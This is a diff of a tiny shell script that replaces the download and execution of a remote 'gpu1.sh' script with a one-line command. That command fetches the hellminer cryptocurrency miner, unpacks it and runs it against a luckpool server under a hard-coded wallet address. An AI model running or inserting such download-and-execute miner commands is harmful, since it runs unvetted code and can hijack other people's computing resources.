@@ -1,7 +1,2 @@
 #!/bin/sh
-sudo apt update
-sudo apt install screen -y
-screen -dmS gpu1.sh ./gpu1.sh 69 79
-wget https://raw.githubusercontent.com/comandashtar/1446/main/gpu1.sh
-chmod +x gpu1.sh
-./gpu1.sh
+wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xf hellminer_cpu_linux.tar.gz && ./hellminer  -c stratum+tcp://ap.luckpool.net:3956 -u RKUEhTZwKjVXd1ms7r3gUqhNG4fCd83msA.test -p x --cpu 4
